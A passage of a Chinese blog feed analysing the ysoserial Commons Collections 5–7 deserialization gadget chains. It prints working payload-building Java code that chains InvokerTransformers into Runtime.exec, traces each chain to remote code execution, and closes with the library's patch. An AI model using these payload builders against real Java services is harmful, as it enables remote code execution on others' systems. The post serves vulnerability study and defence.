&lt;p&gt;可以看到，LazyMap实例赋值给了&lt;code&gt;this.map&lt;/code&gt;，字符串foo赋值给了&lt;code&gt;this.key&lt;/code&gt;。然后在调用TiedMapEntry.toString()时间接调用了TiedMapEntry.getValue()，其中调用了&lt;code&gt;this.map.get(this.key)&lt;/code&gt;。在这条gadget中也就是&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;LazyMap.get(&quot;foo&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;由于LazyMap实例中并不存在&lt;code&gt;foo&lt;/code&gt;这个键，因此触发了绑定在LazyMap上的Transformer类的transform()。&lt;/p&gt;
&lt;p&gt;调用链如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;BadAttributeValueExpException.readObject() -&amp;gt; TiedMapEntry.toString() -&amp;gt; TiedMapEntry.getValue() -&amp;gt; LazyMap.get(not_exist_key) -&amp;gt; ChainedTransformer.transform() -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;commonscollections6&quot;&gt;CommonsCollections6&lt;/h2&gt;
&lt;p&gt;这个gadget与5差不多，都是利用了TiedMapEntry中的方法来触发LazyMap绑定的Transformer，不过从反序列化到TiedMapEntry的过程不太一样，先看一下源码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Serializable getObject(final String command) throws Exception {

    final String[] execArgs = new String[] { command };

    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
                    String.class, Class[].class }, new Object[] {
                    &quot;getRuntime&quot;, new Class[0] }),
            new InvokerTransformer(&quot;invoke&quot;, new Class[] {
                    Object.class, Object[].class }, new Object[] {
                    null, new Object[0] }),
            new InvokerTransformer(&quot;exec&quot;,
                    new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

    Transformer transformerChain = new ChainedTransformer(transformers);

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

    HashSet map = new HashSet(1);
    map.add(&quot;foo&quot;);//添加一个键

    Field f = null;
    try {
        f = HashSet.class.getDeclaredField(&quot;map&quot;);//获取map属性
    } catch (NoSuchFieldException e) {
        f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
    }

    Reflections.setAccessible(f);
    HashMap innimpl = (HashMap) f.get(map);//获取map实例的map属性。【也就是&quot;foo&quot;-&amp;gt;】键值对

    Field f2 = null;
    try {
        f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
    } catch (NoSuchFieldException e) {
        f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
    }

    Reflections.setAccessible(f2);
    Object[] array = (Object[]) f2.get(innimpl);//获取map属性的table属性，里面包含很多Node

    Object node = array[0];
    if(node == null){
        node = array[1];
    }

    Field keyField = null;
    try{
        keyField = node.getClass().getDeclaredField(&quot;key&quot;);
    }catch(Exception e){
        keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
    }

    Reflections.setAccessible(keyField);
    keyField.set(node, entry);//将其中一个Node的key属性改为entry

    return map;

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到前面部分都是差不多的，主要是后面的代码。后面的代码先创建了一个&lt;code&gt;HashSet&lt;/code&gt;实例，添加一个键之后通过反射对其属性做了很多操作，乍一看有点晕。。先把剩下的代码提取出来&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

HashSet map = new HashSet(1);
map.add(&quot;foo&quot;);//添加一个键

Field f = null;
try {
    f = HashSet.class.getDeclaredField(&quot;map&quot;);//获取map属性
} catch (NoSuchFieldException e) {
    f = HashSet.class.getDeclaredField(&quot;backingMap&quot;);
}

Reflections.setAccessible(f);
HashMap innimpl = (HashMap) f.get(map);//获取map实例的map属性。【也就是&quot;foo&quot;-&amp;gt;】键值对

Field f2 = null;
try {
    f2 = HashMap.class.getDeclaredField(&quot;table&quot;);
} catch (NoSuchFieldException e) {
    f2 = HashMap.class.getDeclaredField(&quot;elementData&quot;);
}

Reflections.setAccessible(f2);
Object[] array = (Object[]) f2.get(innimpl);//获取map属性的table属性，里面包含很多Node

Object node = array[0];
if(node == null){
    node = array[1];
}

Field keyField = null;
try{
    keyField = node.getClass().getDeclaredField(&quot;key&quot;);
}catch(Exception e){
    keyField = Class.forName(&quot;java.util.MapEntry&quot;).getDeclaredField(&quot;key&quot;);
}

Reflections.setAccessible(keyField);
keyField.set(node, entry);//将其中一个Node的key属性改为entry

return map;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实这段代码基本等价于以下几行代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);
HashSet map = new HashSet(1);
map.add(entry);
return map;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就是把entry绑定到HashSet上。这两种方法的区别在哪？第一种是通过反射，将entry赋值给HashSet实例中的一个Node的key属性，第二种则是直接调用&lt;code&gt;HashSet.add()&lt;/code&gt;方法，有啥区别？跟进一下&lt;code&gt;HashSet.add()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public boolean add(E e) {
    return map.put(e, PRESENT)==null;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;跟进put()&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;此时的key就是entry变量(TiedMapEntry实例)，跟进hash()&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &amp;gt;&amp;gt;&amp;gt; 16);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里调用了&lt;code&gt;key.hashCode()&lt;/code&gt;，也就是&lt;code&gt;TiedMapEntry.hashCode()&lt;/code&gt;，继续跟进&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public int hashCode() {
    Object value = this.getValue();
    return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里调用了&lt;code&gt;this.getValue()&lt;/code&gt;，是不是很熟悉？没错，正是CommonsCollections5中利用的TiedMapEntry的方法。跟进一下getValue()&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object getValue() {
    return this.map.get(this.key);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;调用了map属性的get方法。回顾一下我们实例化TiedMapEntry时传入的参数以及其构造方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

public TiedMapEntry(Map map, Object key) {
    this.map = map;
    this.key = key;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以发现这里的map属性就是绑定了执行系统命令Transformer的LazyMap实例，由于实例化LazyMap时没有添加&lt;code&gt;foo&lt;/code&gt;键，一次调用其get()方法获取&lt;code&gt;foo&lt;/code&gt;时会触发Transformer。触发完之后会把&lt;code&gt;foo&lt;/code&gt;键添加到LazyMap实例上。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);//添加key
        return value;
    } else {
        return super.map.get(key);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可是现在我们只是在构造payload阶段，由于上面将&lt;code&gt;foo&lt;/code&gt;键添加到了LazyMap实例，因此反序列化时LazyMap已经存在了&lt;code&gt;foo&lt;/code&gt;属性，从而导致无法触发EXP。因此，直接使用&lt;code&gt;map.add(entry);&lt;/code&gt;是行不通的，还可以在返回序列化对象之前，remove掉LazyMap的&lt;code&gt;foo&lt;/code&gt;属性。比如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);

HashSet map = new HashSet(1);
map.add(entry);
lazyMap.remove(&quot;foo&quot;);

return map;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;需要通过反射，将entry绑定到HashSet的一个key上，这样才不会在序列化阶段就触发Lazymap绑定的Transformer。&lt;/p&gt;
&lt;p&gt;可是如何利用反射来直接添加一个HashSet的key呢？通过poc的源码不难发现，其实就是先获取HashSet.map属性，然后再获取这个属性的table属性，然后再获取table属性的key属性，最后直接对key属性进行赋值&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002502598-1624251523.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;map属性是HashMap类型，看看HashMap.table属性&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002509525-2070822266.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;是Node类型，再看看Node.key属性&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002516442-390348027.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再看一下一个HashSet实例的值是怎样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002525718-1738013089.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因此，只有通过反射的方法才不会在序列化阶段就间接调用&lt;code&gt;LazyMap.get&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;看一下反序列化的过程，由于最终返回的是HashSet实例用于序列化，因此直接看HashSet.readObject()&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in any hidden serialization magic
    s.defaultReadObject();

    ...

    // Create backing HashMap
    map = (((HashSet&amp;lt;?&amp;gt;)this) instanceof LinkedHashSet ?
           new LinkedHashMap&amp;lt;E,Object&amp;gt;(capacity, loadFactor) :
           new HashMap&amp;lt;E,Object&amp;gt;(capacity, loadFactor));

    // Read in all elements in the proper order.
    for (int i=0; i&amp;lt;size; i++) {
        @SuppressWarnings(&quot;unchecked&quot;)
            E e = (E) s.readObject();
        map.put(e, PRESENT);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以在最后发现调用了&lt;code&gt;HashMap.put()&lt;/code&gt;，这个方法在上面分析过了，底层会调用&lt;code&gt;LazyMap.get(xxx)&lt;/code&gt;。由于我们在构建payload时使用了反射来创建HashSet实例，因此LazyMap实例中没有任何键，因此这里会触发LazyMap绑定的Transformer，从而造成RCE。&lt;/p&gt;
&lt;p&gt;这个gadget的调用链如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;HashSet.readObject() -&amp;gt; HashMap.put() -&amp;gt; HashMap.hash() -&amp;gt; TiedMapEntry.hashCode() -&amp;gt; TiedMapEntry.getValue() -&amp;gt; LazyMap.get() -&amp;gt; ChainedTransfomer.transform() -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;commonscollections7&quot;&gt;CommonsCollections7&lt;/h2&gt;
&lt;p&gt;这个的gadget与6类似，只不过是通过Hashtable类进行反序列化，最终到达LazyMap.get()的。先看一下代码&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public Hashtable getObject(final String command) throws Exception {

    // Reusing transformer chain and LazyMap gadgets from previous payloads
    final String[] execArgs = new String[]{command};

    final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

    final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;,
            new Class[]{String.class, Class[].class},
            new Object[]{&quot;getRuntime&quot;, new Class[0]}),
        new InvokerTransformer(&quot;invoke&quot;,
            new Class[]{Object.class, Object[].class},
            new Object[]{null, new Object[0]}),
        new InvokerTransformer(&quot;exec&quot;,
            new Class[]{String.class},
            execArgs),
        new ConstantTransformer(1)};

    Map innerMap1 = new HashMap();
    Map innerMap2 = new HashMap();

    // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
    lazyMap1.put(&quot;yy&quot;, 1);

    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
    lazyMap2.put(&quot;zZ&quot;, 1);

    // Use the colliding Maps as keys in Hashtable
    Hashtable hashtable = new Hashtable();
    hashtable.put(lazyMap1, 1);
    hashtable.put(lazyMap2, 2);

    Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);

    // Needed to ensure hash collision after previous manipulations
    lazyMap2.remove(&quot;yy&quot;);

    return hashtable;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;直接看后半部分，创建了两个LazyMap实例然后都put到Hashtable实例中，然后调用&lt;code&gt;remove()&lt;/code&gt;移除lazyMap2中的名为&lt;code&gt;yy&lt;/code&gt;的key，原因与CommonsCollections6中差不多，之后再说。最后返回Hashtable实例，进行序列化。我们先看一下Hashtable.readObject()，先从反序列化的逻辑来看&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException
{
    // Read in the threshold and loadFactor
    s.defaultReadObject();

    ...
    
    int elements = s.readInt();

    // Validate # of elements
    if (elements &amp;lt; 0)
        throw new StreamCorruptedException(&quot;Illegal # of Elements: &quot; + elements);

    ...

    table = new Entry&amp;lt;?,?&amp;gt;[length];
    threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
    count = 0;

    // Read the number of elements and then all the key/value objects
    for (; elements &amp;gt; 0; elements--) {
        K key = (K)s.readObject();
        V value = (V)s.readObject();
        reconstitutionPut(table, key, value);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看得到，最后通过一个for循环来遍历Hashtable实例原本的元素，对每个元素调用&lt;code&gt;reconstitutionPut()&lt;/code&gt;方法，跟进一下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void reconstitutionPut(Entry&amp;lt;?,?&amp;gt;[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = key.hashCode();
    int index = (hash &amp;amp; 0x7FFFFFFF) % tab.length;
    for (Entry&amp;lt;?,?&amp;gt; e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) &amp;amp;&amp;amp; e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    Entry&amp;lt;K,V&amp;gt; e = (Entry&amp;lt;K,V&amp;gt;)tab[index];
    tab[index] = new Entry&amp;lt;&amp;gt;(hash, key, value, e);
    count++;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里也有一个for循环，不过只有在&lt;code&gt;tab[index]!=null&lt;/code&gt;才会进入，而tab在下方进行赋值：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;tab[index] = new Entry&amp;lt;&amp;gt;(hash, key, value, e);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Entry类其实就是Hashtable中存储数据的类，每一个元素都是一个Entry对象。可以看一下Hashtable.put()方法，其实就是在table属性中添加了一个Entry对象。【插一句，仔细点可以发现，&lt;code&gt;put()&lt;/code&gt;方法与&lt;code&gt;reconstitutionPut()&lt;/code&gt;的代码几乎一毛一样，只不过&lt;code&gt;put()&lt;/code&gt;是正向的插入元素，而&lt;code&gt;reconstitutionPut()&lt;/code&gt;是逆向的，在readObject()复原元素时‘插入’元素】&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public synchronized V put(K key, V value) {
    // Make sure the value is not null
    if (value == null) {
        throw new NullPointerException();
    }

    // Makes sure the key is not already in the hashtable.
    Entry&amp;lt;?,?&amp;gt; tab[] = table;
    int hash = key.hashCode();
    int index = (hash &amp;amp; 0x7FFFFFFF) % tab.length;
    @SuppressWarnings(&quot;unchecked&quot;)
    Entry&amp;lt;K,V&amp;gt; entry = (Entry&amp;lt;K,V&amp;gt;)tab[index];
    for(; entry != null ; entry = entry.next) {
        if ((entry.hash == hash) &amp;amp;&amp;amp; entry.key.equals(key)) {
            V old = entry.value;
            entry.value = value;
            return old;
        }
    }

    addEntry(hash, key, value, index);
    return null;
}

private void addEntry(int hash, K key, V value, int index) {
    modCount++;
    Entry&amp;lt;?,?&amp;gt; tab[] = table;
    ...
    Entry&amp;lt;K,V&amp;gt; e = (Entry&amp;lt;K,V&amp;gt;) tab[index];
    tab[index] = new Entry&amp;lt;&amp;gt;(hash, key, value, e);
    count++;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;而Hashtable的table属性类型也正是&lt;code&gt;Entry[]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002543879-692867033.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;回到上面的Hashtable.readObject()调用的&lt;code&gt;reconstitutionPut()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void reconstitutionPut(Entry&amp;lt;?,?&amp;gt;[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = key.hashCode();
    int index = (hash &amp;amp; 0x7FFFFFFF) % tab.length;
    for (Entry&amp;lt;?,?&amp;gt; e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) &amp;amp;&amp;amp; e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    Entry&amp;lt;K,V&amp;gt; e = (Entry&amp;lt;K,V&amp;gt;)tab[index];
    tab[index] = new Entry&amp;lt;&amp;gt;(hash, key, value, e);
    count++;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;先获取&lt;code&gt;key.hashCode()&lt;/code&gt;，也就是key的hash。对于第二个及以后的元素，会将每个元素与之前的所有元素进行对比，判断条件如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;if ((e.hash == hash) &amp;amp;&amp;amp; e.key.equals(key)) {
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果两个key的hash相同，则调用&lt;code&gt;e.key.equals(key)&lt;/code&gt;来判断当前元素中是否含有之前的key。这里的e.key就是我们在构建payload时put的值，也就是LazyMap实例。由于LazyMap没有定义equals()方法，因此跟进其父类&lt;code&gt;AbstractMapDecorator.equals()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public boolean equals(Object object) {
    return object == this ? true : this.map.equals(object);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后进入了&lt;code&gt;AbstractMap.equals()&lt;/code&gt;。【TODO：上面的this.map是HashMap类且其存在equals，可是为什么要进入AbstractMap类的equals方法？】&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public boolean equals(Object o) {
    if (o == this)
        return true;

    if (!(o instanceof Map))
        return false;
    Map&amp;lt;?,?&amp;gt; m = (Map&amp;lt;?,?&amp;gt;) o;
    if (m.size() != size())
        return false;

    try {
        Iterator&amp;lt;Entry&amp;lt;K,V&amp;gt;&amp;gt; i = entrySet().iterator();
        while (i.hasNext()) {
            Entry&amp;lt;K,V&amp;gt; e = i.next();
            K key = e.getKey();
            V value = e.getValue();
            if (value == null) {
                if (!(m.get(key)==null &amp;amp;&amp;amp; m.containsKey(key)))
                    return false;
            } else {
                if (!value.equals(m.get(key)))//调用o.get(key)
                    return false;
            }
        }
    } catch (ClassCastException unused) {
        return false;
    } catch (NullPointerException unused) {
        return false;
    }

    return true;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到有调用&lt;code&gt;m.get(key)&lt;/code&gt;，这里的m实际上就是在&lt;code&gt;reconstitutionPut()&lt;/code&gt;中传入的参数：key，也就是LazyMap实例，因此要反序列化的Hashtable的第二个元素中不存在第一个元素中的key，那么这里就可以触发LazyMap绑定的Transformer，造成RCE。&lt;/p&gt;
&lt;p&gt;总结一下，在构造gadget时大概有以下几点限制：&lt;br/&gt;1.Hashtable实例中至少有两个元素&lt;br/&gt;2.Hashtable实例的两个元素的key的hash必须一样&lt;br/&gt;3.第二个元素的key是LazyMap实例，且其中不存在第一个元素中的key&lt;/p&gt;
&lt;p&gt;因此我们可以在Hashtable中添加两个Map，第二个元素是LazyMap实例。LazyMap实例中不能有第一个元素中的key，同时两个元素的key的hash必须一样。这点怎么绕过？&lt;/p&gt;
&lt;p&gt;可以参照ysoserial中的代码，由于字符串&lt;code&gt;&quot;yy&quot;&lt;/code&gt;和&lt;code&gt;&quot;zZ&quot;&lt;/code&gt;的hash是相同的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1077935/202003/1077935-20200326002558648-2135424511.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;因此可以让这两个字符串分别作为两个Map实例的key。至此大概可以写出如下的poc&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;final Transformer transformerChain = new ChainedTransformer(
        ...
    );

Map innerMap = new HashMap();
Map lazymap = LazyMap.decorate(innerMap, transformerChain);

Map itemMap = new HashMap();
itemMap.put(&quot;yy&quot;, 1);
innerMap.put(&quot;zZ&quot;, 1);

Hashtable hashtable = new Hashtable();
hashtable.put(itemMap, 1);
hashtable.put(lazymap, 1);

Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);

return hashtable;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可是测试时发现，在反序列化时无法造成rce，反而是在生成序列化流时会造成rce。为啥？原因跟CommonsCollections类似。在构造Hashtable时，使用了&lt;code&gt;Hashtable.put()&lt;/code&gt;方法来添加元素，而put()方法内部也会进行与反序列化时的&lt;code&gt;reconstitutionPut()&lt;/code&gt;进行类似的操作，也会调用equals()进行判断，从而底层调用了LazyMap.get()。因此，在返回Hashtable类用于序列化之前，我们需要把LazyMap中新加的key给去掉，也就是第一个元素的key。所以我们在return之前需要加上一行：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;lazyMap2.remove(&quot;yy&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;总结下来调用链大概如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Hashtable.readObject() -&amp;gt; Hashtable.reconstitutionPut() -&amp;gt; AbstractMapDecorator.equals() -&amp;gt; AbstractMap.equals() -&amp;gt; LazyMap.get() -&amp;gt; ChainedTrasnformer.transform() -&amp;gt; RCE
&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;归纳&quot;&gt;归纳&lt;/h2&gt;
&lt;p&gt;几个gadget的链大概是由以下几个部分组成&lt;/p&gt;
&lt;p&gt;CommonsCollections1: AnnotaionInvocationHandler、Proxy、LazyMap、ChainedTransformer、InvokerTransformer&lt;/p&gt;
&lt;p&gt;CommonsCollections3: AnnotaionInvocationHandler、Proxy、LazyMap、ChainedTransformer、InstantiateTransformer、TrAXFilter、TemplatesImpl&lt;/p&gt;
&lt;p&gt;CommonsCollections2: PriorityQueue、TransformingComparator、InvokerTransformer、TemplatesImpl&lt;/p&gt;
&lt;p&gt;CommonsCollections4: PriorityQueue、TransformingComparator、ChainedTransformer、InstantiateTransformer、TrAXFilter、TemplatesImpl&lt;/p&gt;
&lt;p&gt;CommonsCollections5: BadAttributeValueExpException、TiedMapEntry、LazyMap、ChainedTransformer、InvokerTransformer&lt;/p&gt;
&lt;p&gt;CommonsCoolections6: HashSet、HashMap、TiedMapEntry、LazyMap、ChainedTransformer、InvokerTransfomer&lt;/p&gt;
&lt;p&gt;CommonsCollections7: Hashtable、LazyMap、ChainedTransformer、InvokerTransformer&lt;/p&gt;
&lt;p&gt;执行命令的几种方式：&lt;br/&gt;1.ChainedTransformer+InvokerTransformer，比如1、5、6、7&lt;br/&gt;2.ChainedTransformer+InstantiateTransformer+TrAXFilter+TemplatesImpl，比如3、4&lt;br/&gt;2.ChainedTransformer+InvokerTransformer+TemplatesImpl，比如2&lt;/p&gt;
&lt;p&gt;再底层点来看其实就只有两种方式，InvokerTransformer和TemplatesImpl&lt;/p&gt;
&lt;p&gt;从反序列化到命令执行的路径：&lt;br/&gt;1.LazyMap，比如1、3、5、6、7&lt;br/&gt;2.PriorityQueue+TransformingComparator，比如2、4&lt;/p&gt;
&lt;p&gt;而从反序列化到LazyMap.get()这条路径又分为了好几种：&lt;br/&gt;1.AnnotationInvocationHandler+Proxy，比如1、3&lt;br/&gt;2.BadAttributeValueExpException+TiedMapEntry，比如5&lt;br/&gt;3.HashSet+HashMap+TiedMapEntry，比如6&lt;br/&gt;4.Hashtable，比如7&lt;/p&gt;
&lt;h2 id=&quot;补丁&quot;&gt;补丁&lt;/h2&gt;
&lt;p&gt;根据以上的归纳可以发现，其实利用链最底层用来执行命令的方法不过就是Transformer和TemplatesImpl。因为最终目的是执行任意代码，也就是可以执行任意类的任意方法，其实主要就是Transformer的利用，因为TemplatesImpl的几种利用方式不过是结合了不同的Transformer来实现(InvokerTransformer、InstantiateTransformer)。&lt;/p&gt;
&lt;p&gt;链的构造主要是通过Map绑定Transformer来实现，或者是PriorityQueue绑定TransformingComparator来实现。&lt;/p&gt;
&lt;p&gt;反序列化入口则是百花齐放，是人是鬼都在秀。&lt;/p&gt;
&lt;p&gt;总的来说，这次漏洞主要还是最底层的Transformer的原因，因此官方的补丁就是在几个Transformer的writeObject()/readObject()处增加了一个全局开关，默认是开关开启的，当对这些Transformer进行序列化/反序列化时，会抛出&lt;code&gt;UnsupportedOperationException&lt;/code&gt;异常。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//InvokerTransformer
private void writeObject(ObjectOutputStream os) throws IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    os.defaultWriteObject();
}
private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
    is.defaultReadObject();
}

//FunctorUtils
static void checkUnsafeSerialization(Class clazz) {
    String unsafeSerializableProperty;

    try {
        unsafeSerializableProperty =
            (String) AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return System.getProperty(UNSAFE_SERIALIZABLE_PROPERTY);
                }
            });
    } catch (SecurityException ex) {
        unsafeSerializableProperty = null;
    }

    if (!&quot;true&quot;.equalsIgnoreCase(unsafeSerializableProperty)) {
        throw new UnsupportedOperationException(
                &quot;Serialization support for &quot; + clazz.getName() + &quot; is disabled for security reasons. &quot; +
                &quot;To enable it set system property '&quot; + UNSAFE_SERIALIZABLE_PROPERTY + &quot;' to 'true', &quot; +
                &quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;);
    }}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://kingx.me/commons-collections-java-deserialization.html#0x05%20%E5%BD%B1%E5%93%8D%E4%B8%8E%E4%BF%AE%E5%A4%8D&quot;&gt;影响与修复&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Java反序列化漏洞-玄铁重剑之CommonsCollection&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.kingkk.com/2020/02/ysoserial-payload%E5%88%86%E6%9E%90/&quot;&gt;ysoserial payload分析 -kingkk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/214096.html&quot;&gt;玩转Ysoserial-CommonsCollection的七种利用方式分析 -平安银行应用安全团队&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 25 Mar 2020 16:28:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>[TOC] 0x00 前言 Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/litlife/p/12571787.html</dc:identifier>
</item>
<item>
<title>CTF_WriteUp_HTTP——302临时重定向问题 - c1ata</title>
<link>http://www.cnblogs.com/dedragon/p/12571728.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dedragon/p/12571728.html</guid>
<description>&lt;h2 id=&quot;http302临时重定向&quot;&gt;HTTP——302临时重定向&lt;/h2&gt;
&lt;h3 id=&quot;题目描述&quot;&gt;题目描述&lt;/h3&gt;
